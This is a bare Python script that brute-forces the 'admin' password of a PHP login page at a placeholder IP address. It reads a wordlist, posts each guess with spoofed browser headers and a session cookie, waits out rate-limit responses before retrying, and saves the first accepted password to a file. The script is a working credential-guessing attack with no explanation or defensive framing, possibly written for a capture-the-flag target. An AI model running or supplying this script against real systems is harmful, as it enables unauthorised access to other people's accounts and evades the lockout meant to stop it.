import requests
import re 
import time

file_path = 'passwords.txt'
index = 0
seconds = 0
_exceeded = r"exceeded"
_fail = r"not valid"
lines = []  

with open(file_path, 'r') as file:
    for line in file:
        lines.append(line.strip()) 
while index < len(lines):
    
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://[IP]',
            'Referer': 'http://[IP]/login.php',
            'Cookie': 'PHPSESSID=[value]',
            'Upgrade-Insecure-Requests': '1'
    }

        
    data = {
            'username': 'admin',
            'password': lines[index]
    }
    print("try password {0}", lines[index], end='\r')

    
    url = 'http://[IP]/login.php'

    
    response = requests.post(url, headers=headers, data=data)

    text = response.text
    exceeded = re.findall(_exceeded,text)
    fail = re.findall(_fail,text)
    if(len(exceeded) != 0):
        seconds += 1
        print("status exceeded " + lines[index] + "sec: " + str(seconds), end='\r')
    elif(len(fail) != 0):
        print("status wrong " + lines[index], end='\r')
        seconds = 0
        index +=1
    else:
        print("found valid password " + lines[index] + " at " + str(index))
        file_path = 'output.txt'  
        with open(file_path, 'w') as file:
        
           file.write("\n"+ lines[index] +"\n")
        break;
    time.sleep(1)
